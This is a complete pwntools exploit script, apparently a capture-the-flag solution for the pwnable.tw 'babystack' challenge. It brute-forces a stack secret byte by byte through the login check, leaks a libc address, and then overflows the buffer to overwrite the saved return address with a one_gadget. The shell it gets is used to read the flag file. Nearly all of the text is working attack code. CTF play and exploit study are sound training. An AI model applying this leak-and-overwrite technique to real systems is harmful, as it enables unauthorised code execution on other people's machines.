#!/usr/bin/env python3
from pwn import *

PORT = 10205
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./babystack_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000000F7D
            brva 0x0000000000000EC7
            brva 0x0000000000000E53
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def option(opt):
    p.sendlineafter(b'>> ', str(opt).encode())

def login(pl) -> bool:
    option(1)
    p.sendafter(b'Your passowrd :', pl)
    response = p.recvuntil(b' !\n')
    return b'Login Success !' in response

def magic_copy(pl) -> None:
    option(3)
    p.sendafter(b'Copy :', pl)
    p.recvuntil(b'It is magic copy !\n')

def brute_force(init: bytes = b'', length: int = 16):
    recovered = bytearray(init)

    while len(recovered) < length:
        found = False

        for candidate in range(0x01, 0x100):
            guess = bytes(recovered) + p8(candidate) + b'\x00'

            if login(guess):
                recovered.append(candidate)
                log.success(
                    f'byte[{len(recovered) - 1:}] = '
                    f'{candidate:#04x} | {bytes(recovered).hex()}'
                )

                option(1)
                found = True
                break

        if not found:
            log.warning(
                f'Fail recovery! Real byte may be null byte'
            )
            return None

    return bytes(recovered)

# Stage 1: Leak secret

secret = brute_force(length = 16)
log.success(f'secret_leak: 0x{secret.hex()}')

# Stage 2: Leak libc
# GDB()
login(b'C'*0x48)
login(b'\x00')

magic_copy(b'D')

option(1)

leak = brute_force(
    init = b'C'*8,
    length = 14
)

libc_leak = u64(leak[8:14].ljust(8, b'\x00'))
log.success(f'libc_leak: {libc_leak:#x}')
libc.address = libc_leak - 0x78439
log.success(f'libc_base: {libc.address:#x}')

# Stage 3: Overwrite saved rip

og = libc.address + 0x45216

pl = flat({
    0x40: secret,   # secret
    0x68: og        # saved rip
    }, length = 0x70, filler = b'A')

login(pl)
login(b'\x00')
magic_copy(b'D')
# GDB()
option(2)
p.sendline(b'cat /home/babystack/flag')
p.interactive()

# d1nhdwc